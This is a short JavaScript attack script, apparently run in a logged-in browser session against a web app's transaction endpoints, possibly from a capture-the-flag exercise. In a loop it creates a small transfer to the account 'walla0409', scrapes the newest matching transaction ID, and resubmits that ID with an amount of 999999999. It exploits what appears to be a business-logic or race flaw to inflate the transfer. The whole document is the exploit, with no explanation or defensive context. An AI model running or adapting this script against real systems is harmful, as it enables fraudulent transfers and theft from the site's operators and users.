const user  = 'walla0409';
const txURL = '/?action=create-transaction';
const list  = '/?action=transactions-list';
const hdr   = { 'Content-Type':'application/x-www-form-urlencoded' };

let busy = false;

setInterval(async () => {
  if (busy) return;        // skip tick if the previous one is still running
  busy = true;

  try {
    await fetch(txURL, {
      method:'POST',
      headers:hdr,
      body:`recipient=${user}&amount=10`,
      credentials:'include'
    });

    await new Promise(r => setTimeout(r, 10));      // let the row appear

    const html = await (await fetch(list,{credentials:'include'})).text();
    const doc  = new DOMParser().parseFromString(html,'text/html');
    const ids  = [...doc.querySelectorAll('tr')]
                   .filter(tr => tr.cells[2]?.textContent.trim() === user)
                   .map(tr => +tr.cells[0].textContent.trim());

    if (!ids.length) return console.log('no rows for', user);
    const id = Math.max(...ids);

    await fetch(txURL, {
      method:'POST',
      headers:hdr,
      body:`recipient=${user}&amount=999999999&transaction_id=${id}`,
      credentials:'include'
    });

    console.log('confirmed id', id);
  } finally {
    busy = false;
  }

}, 500);    

